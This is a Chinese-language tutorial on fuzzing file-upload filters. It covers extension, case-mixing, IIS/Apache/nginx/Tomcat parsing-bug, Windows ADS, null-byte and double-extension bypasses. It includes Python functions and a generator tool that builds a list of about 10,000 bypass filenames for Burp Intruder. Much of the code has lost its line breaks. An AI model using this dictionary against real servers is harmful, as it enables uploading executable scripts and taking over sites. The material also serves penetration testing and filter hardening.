# 文件Fuzz



**利用点**在动手之前我们来思考下上传漏洞跟那些因素有关：**1.可解析的后缀，也就是该语言有多个可解析的后缀，比如php语言可解析的后缀为php,php2,php3等等2.大小写混合，如果系统过滤不严，可能大小写可以绕过。3.中间件，每款中间件基本都解析漏洞,比如iis就可以把xxx.asp;.jpg当asp来执行。4.系统特性，特别是Windows的后缀加点（.）,加空格，加::$DATA可以绕过目标系统。5.语言漏洞，流行的三种脚本语言基本都存在00截断漏洞。6.双后缀，这个与系统和中间件无关，偶尔会存在于代码逻辑之中。**整理以上思考，我们把生成字典的规则梳理为以下几条：

> 可解析的后缀+大小写混合可解析的后缀+大小写混合+中间件漏洞.htaccess + 大小写混合可解析的后缀+大小写混合+系统特性可解析的后缀+大小写混合+语言漏洞可解析的后缀+大小写混合+双后缀

下面我们根据上面的构想，来分析每一方面的细节，并使用代码来实现。

*   中间件

    > **4.1 iis**
    >
    > iis一共有三个解析漏洞：1.IIS6.0文件解析 xx.asp;.jpg2.IIS6.0目录解析 xx.asp/1.jpg3.IIS 7.0畸形解析 xxx.jpg/x.asp由于2和3和上传的文件名无关，故我们只根据1来生成fuzz字典def iis\_suffix\_creater(suffix):res = \[]for l in suffix:str ='%s;.%s' % (l,allow\_suffix)res.append(str)return resapache相关的解析漏洞有两个：1.%0a(CVE-2017-15715)2.未知后缀 test.php.xxx根据以上构造`apache_suffix_builder`函数生成规则：def apache\_suffix\_creater(suffix):res = \[]for l in suffix:str = '%s.xxx' % lres.append(str)str = '%s%s' % (l,urllib.unquote('%0a')) #CVE-2017-15715res.append(str)return res
    >
    > **4.3 nginx**
    >
    > nginx解析漏洞有三个：
    >
    > > 访问连接加/xxx.php test.jpg/xxx.php畸形解析漏洞 test.jpg%00xxx.phpCVE-2013-4547 test.jpg(非编码空格)\0x.php
    >
    > **4.4 tomcat**
    >
    > tomcat用于上传绕过的有三种,不过限制在windows操作系统下。xxx.jsp/xxx.jsp%20xxx.jsp::$DATA根据以上规则生成字典对应的代码为：win\_tomcat = \['%20','::$DATA','/']def tomcat\_suffix\_creater(suffix):res = \[]for l in suffix:for t in win\_tomcat:str = '%s%s' % (l,t)res.append(str)return res如果确定中间件为apache,可以加入.htaccess。同时如果操作系统还为windows，我们可以大小写混合。if (middleware == 'apache' or middleware == 'all') and (os == 'win' or os == 'all'):htaccess\_suffix = uperTest(".htaccess")elif (middleware == 'apache' or middleware == 'all') and os == 'linux':htaccess\_suffix = \['.htaccess']else:htaccess\_suffix = \[]
    >
    > **4.5 语言，中间件与操作系统的关系**
    >
    > 以上我们根据每个中间件的漏洞，编写了对应的fuzz字典生成函数。在最终生成字典时，我们还要考虑中间件可以运行那些语言，以及它们与平台的关系。

    | 语言       | IIS | Apache | Tomcat | Window | Linux |
    | -------- | --- | ------ | ------ | ------ | ----- |
    | asp/aspx | √   | √      | ×      | √      | √     |
    | php      | √   | √      | √      | √      | √     |
    | jsp      | √   | ×      | √      | √      | √     |

    > 根据上表，我们明白：iis下可以运行asp/aspx,php,jsp脚本，故这3种脚本语言可解析后缀均应该传入iis\_suffix\_builder()进行处理；apache下可以运行asp/aspx,php。故这2两种脚本语言可解析后缀均应该传入apache\_suffix\_builder()进行处理；tomcat下可以运行php，jsp，故这两个脚本语言可解析后缀均应该传入tomcat\_suffix\_builder()进行处理。注意：根据对tomcat上传的绕过分析，发现之后在windows平台下才能成功。故之后在Windows平台下才会调用`tomcat_suffix_builder()`对可解析后缀进行处理。故伪代码可以编写如下：if middleware == 'iis':case\_asp\_php\_jsp\_parse\_suffix = case\_asp\_parse\_suffix + case\_php\_parse\_suffix + case\_jsp\_parse\_suffixmiddleware\_parse\_suffix = iis\_suffix\_creater(case\_asp\_php\_jsp\_parse\_suffix)elif middleware == 'apache':case\_asp\_php\_html\_parse\_suffix = case\_asp\_parse\_suffix + case\_php\_parse\_suffix + case\_html\_parse\_suffixmiddleware\_parse\_suffix = apache\_suffix\_creater(case\_asp\_php\_html\_parse\_suffix)elif middleware == 'tomcat' and os == 'linux':middleware\_parse\_suffix = case\_php\_parse\_suffix + case\_jsp\_parse\_suffixelif middleware == 'tomcat' and (os == 'win' or os == 'all'):case\_php\_jsp\_parse\_suffix = case\_php\_parse\_suffix + case\_jsp\_parse\_suffixmiddleware\_parse\_suffix = tomcat\_suffix\_creater(case\_php\_jsp\_parse\_suffix)else:case\_asp\_php\_parse\_suffix = case\_asp\_parse\_suffix + case\_php\_parse\_suffixiis\_parse\_suffix = iis\_suffix\_creater(case\_asp\_php\_parse\_suffix)case\_asp\_php\_html\_parse\_suffix = case\_asp\_parse\_suffix + case\_php\_parse\_suffix + case\_html\_parse\_suffixapache\_parse\_suffix = apache\_build(case\_asp\_php\_html\_parse\_suffix)case\_php\_jsp\_parse\_suffix = case\_php\_parse\_suffix + case\_jsp\_parse\_suffixtomcat\_parse\_suffix = tomcat\_build(case\_php\_jsp\_parse\_suffix)middleware\_parse\_suffix = iis\_parse\_suffix + apache\_parse\_suffix + tomcat\_parse\_suffix
    >
    > #### 五、系统特性 <a href="#wu-xi-tong-te-xing" id="wu-xi-tong-te-xing"></a>
    >
    > 经过查资料，目前发现在系统层面，有以下特性可以被上传漏洞所利用。Windows下文件名不区分大小写，Linux下文件名区分大写欧西；Windows下ADS流特性，导致上传文件xxx.php::$DATA = xxx.php；Windows下文件名结尾加入`.`,`空格`,`<`,·`>`,`>>>`,`0x81-0xff`等字符，最终生成的文件均被windows忽略。# 生成0x81-0xff的字符listdef str\_81\_to\_ff():res = \[]for i in range(129,256):str = '%x' % istr = '%' + strstr = urllib.unquote(str)res.append(str)return reswindows\_os = \[' ','.','/','::$DATA','<','>','>>>','%20','%00'] + str\_81\_to\_ff()def windows\_suffix\_builder(suffix):res = \[]for s in suffix:for w in windows\_os:str = '%s%s' % (s,w)res.append(str)return res
    >
    > #### 六、语言的漏洞 <a href="#liu-yu-yan-de-lou-dong" id="liu-yu-yan-de-lou-dong"></a>
    >
    > 语言漏洞被利用于上传的有%00截断和0x00截断。它们在asp，php和jsp中都存在着。def str\_00\_truncation(suffix,allow\_suffix):res = \[]for i in suffix:str = '%s%s.%s' % (i,'%00',allow\_suffix)res.append(str)str = '%s%s.%s' % (i,urllib.unquote('%00'),allow\_suffix)res.append(str)return res
    >
    > #### 七、双后缀 <a href="#qi-shuang-hou-zhui" id="qi-shuang-hou-zhui"></a>
    >
    > 有些站点通过对上传文件名进行删除敏感字符（php,asp,jsp等等）的方式进行过滤,例如你上传一个aphp.jpg的文件，那么上传之后就变成了a.jpg。这时就可以利用双后缀的方式上传一个a.pphphp,最终正好生成a.php。其实双后缀与中间件和操作系统无关，而是和代码逻辑有关。针对双后缀，我们可以写个`str_double_suffix_creater(suffix)`函数，传入后缀名suffix即可生成所有的双后缀可能。def str\_double\_suffix\_creater(suffix):res = \[]for i in range(1,len(suffix)):str = list(suffix)str.insert(i,suffix)res.append("".join(str))return res在`list_double_suffix_creater(suffix)`函数基础上，可以编写`list_double_suffix_creater(list_suffix)`来为一个list生成所有双后缀可能。def list\_double\_suffix\_creater(list\_suffix):res = \[]for l in list\_suffix:res += double\_suffix\_creater(l)return duplicate\_removal(res)工具$ python upload-fuzz-dic-builder.py -husage: upload-fuzz-dic-builder \[-h] \[-n] \[-a] \[-l] \[-m] \[--os] \[-d] \[-o]​optional arguments:-h, --help show this help message and exit-n , --upload-filenameUpload file name-a , --allow-suffix Allowable upload suffix-l , --language Uploaded script language-m , --middleware Middleware used in Web System--os Target operating system type-d, --double-suffix Is it possible to generate double suffix?-o , --output Output file脚本可以之定义生成的上传文件名（-n），允许的上传的后缀（-a），后端语言（-l），中间件(-m),操作系统（--os），是否加入双后缀（-d）以及输出的字典文件名（-o）。我们可以根据场景来生成合适的字典，提供的信息越详细，脚本生成的字典越精确。由于知道我们的后端语言为`php`,中间件为`apache`，操作系统为`Windows`。所以可以利用这些信息生成更精确的fuzz字典。$ python upload-fuzz-dic-builder.py -l php -m apache --os win\[+] 收集17条可解析后缀完毕！\[+] 加入145条可解析后缀大小写混合完毕！\[+] 加入152条中间件漏洞完毕！\[+] 加入37条.htaccess完毕！\[+] 加入10336条系统特性完毕！\[+] 去重后共10753条数据写入upload\_fuzz\_dic.txt文件
    >
    > **抓包使用burp的Intruder模块对上传名称进行fuzz <在HTTP协议层面绕过WAF>**
